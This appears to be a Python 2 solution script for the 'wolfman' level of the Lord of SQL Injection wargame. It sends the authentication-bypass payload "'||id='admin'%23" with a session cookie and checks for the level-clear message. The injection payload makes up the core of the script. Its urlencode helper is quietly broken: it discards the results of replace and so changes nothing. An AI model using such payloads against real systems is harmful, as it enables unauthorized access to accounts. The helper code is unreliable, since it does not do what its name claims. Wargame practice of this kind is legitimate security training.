#!/usr/bin/python
# coding: utf-8

import requests
import urllib


def urlencode(query):
    replacement = {
        '#': '%23',
        '&': '%26',
        ' ': '%20',
        '=': '%3D',
        '+': '%2B',
        '\'': '%27',
        '%': '%25'
    }

    for r in replacement:
        query.replace(r, replacement[r])

    return query

#URL을 설정합니다.
url = "http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php"
param = urlencode("?pw='||id='admin'%23")


session = input("Input your LOS session : ")
headers = {
    'Cookie': 'PHPSESSID={0}'.format(session)
}


r = requests.get(url + param, headers=headers)

if r.text.find("<h2>WOLFMAN Clear!</h2>") > 0:
    print "Wolfman Clear!"
    
